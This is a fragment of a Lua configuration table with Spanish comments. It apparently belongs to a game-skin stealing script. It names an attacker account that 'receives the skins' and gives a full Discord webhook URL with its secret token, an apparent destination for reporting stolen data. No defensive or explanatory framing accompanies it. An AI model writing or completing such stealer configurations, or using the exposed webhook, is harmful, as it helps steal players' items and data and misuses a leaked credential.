local CONFIG = {
    ...
    TARGET_NAME   = "JorgeElProo105", -- username de la cuenta que recibe las skins
    ...
    WEBHOOK = {
        URL  = "https://discord.com/api/webhooks/1549629487065473165/fxuu2pDPhDMy6UPXYV2ShPWh4tcrIthRMSIJEUcGKndSJtpd9n8OiW-tzbx9kue09lDn", -- "https://discord.com/api/webhooks/" webhook de Discord
